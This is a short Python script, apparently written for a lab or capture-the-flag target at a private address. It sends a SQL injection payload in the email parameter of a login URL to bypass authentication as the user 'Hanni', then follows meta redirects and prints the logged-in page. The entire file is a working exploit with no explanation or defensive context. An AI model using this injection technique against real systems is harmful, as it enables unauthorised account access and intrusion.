import requests
import re

s = requests.Session()

baseurl = 'http://10.0.23.22/myspray/'

#you can login with a get with querystring parameters with email and password
response = s.get(baseurl + 'login.html?email=%27+or+first_name+%3D+%27Hanni%27%3B&password=&login=Login')

#regex to look for meta redirects
regex = re.compile('<meta[^>]*?url=(.*?)["\']', re.IGNORECASE)

match = regex.search(response.text)

while match: #loop for redirecting until logged in
    response = s.get(baseurl + match.groups()[0].strip())
    match = regex.search(response.text)

print response.text
